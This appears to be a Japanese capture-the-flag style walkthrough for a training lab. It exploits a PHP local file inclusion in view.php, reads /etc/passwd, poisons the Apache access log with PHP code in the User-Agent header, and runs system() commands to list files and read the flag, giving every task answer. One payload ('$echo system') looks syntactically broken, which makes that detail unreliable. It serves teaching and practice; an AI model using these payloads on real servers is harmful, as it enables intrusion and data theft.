---
created: 2026-01-09 12:22
modified: 2026-02-20 16:15
environment: [Server/Web]
vulnearability: [LFI/LogPoisoning]
type: pentest-walkthrough
pentest_category: Web
platform: [PurpleFlair]
tools: []
cve: []
tags: Log
---

# [Pentest-Walkthrough] Web - Project: LFI攻撃検証2

Webアプリケーションを調査して脆弱性を特定し、以下に示されるタスクを完了してください。

Webアプリケーションを調査

以下のURLにアクセスし、問題に解答してください。

```
http://10.234.132.23:8080
```

今回はLFI脆弱性がテーマであるため、その発生箇所の特定から行います。

LFI脆弱性はファイルインクールドの指定が外部から操作できてしまうときに発生する脆弱性であるため、ファイル名を指定できそうなパラメータに注目します。

すると、/view.phpにおいて、pageというパラメータがあり、ここに/etc/passwdと指定すると以下のようにサーバ内の/etc/passwdが出力されます。

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin Debian-exim:x:101:101::/var/spool/exim4:/usr/sbin/nologin 
```

これにより、LFI脆弱性を利用してファイルの内容を漏洩させることができました。

よって、タスク1の答えは、view.phpです。

フラグは、説明文より/`<random>`_flag.txtに存在しますが、任意のコードが記述されたファイルをアップロードすることはできないため、サーバ内のログファイルにPHPコードを記録させて、そのログファイルを読ませることで任意コード実行につなげていきます。

この際のログファイルとしては、/var/log/apache2/access.log等が挙げられます。access.logには、アクセスしてきたクライアントのIPアドレスやUser Agent名が記録されています。そこで、以下のようにUser Agentに<?php phpinfo(); ?>と記載してリクエストしてみます。

```
curl -A "<?php phpinfo(); ?>" http://<target1_ip>:8080
```

これにより、access.logには、<?php phpinfo(); ?>という文字列が記録されたはずです。

このファイルをインクルードすることができれば、内部にある文字列をPHPのコードとして解釈します。そこで、以下のようにしてログファイルにアクセスすると、確かにphpinfo()の実行が確認できます。

```
curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/access.log
```

よって、タスク2の答えは、/var/log/apache2/access.logです。

解説

あとは、サーバ内の/`<random>`_flag.txtを読み込めば良いので、まずはファイル名を特定します。

そこで、以下のようにアクセスをします。

```
curl -A "<?php $echo system('ls /'); ?>" http://<target1_ip>:8080
curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/access.log 
```

すると、以下のような出力が得られます。

```
172.25.0.1 - - [27/Sep/2024:09:30:41 +0000] "GET / HTTP/1.1" 200 859 "-" "bin boot dev etc home lib lib64 media mnt opt proc qieiuh121123_flag.txt root run sbin srv start.sh sys tmp usr var " 
```

フラグが格納されているファイル名は、qieiuh121123_flag.txtであることがわかりました。

あとは、このファイルを読み込みます。

```
curl -A "<?php $echo system('cat /qieiuh121123_flag.txt'); ?>" http://<target1_ip>:8080
curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/access.log 

```

すると、以下のような出力が得られます。

```
172.16.33.1 - - [02/Sep/2024:04:49:20 +0000] "GET / HTTP/1.1" 200 859 "-" "flag{LOg_P01s0n1Ng_lf1}" 
```

よって、タスク3の答えは、flag{LOg_P01s0n1Ng_lf1}です。
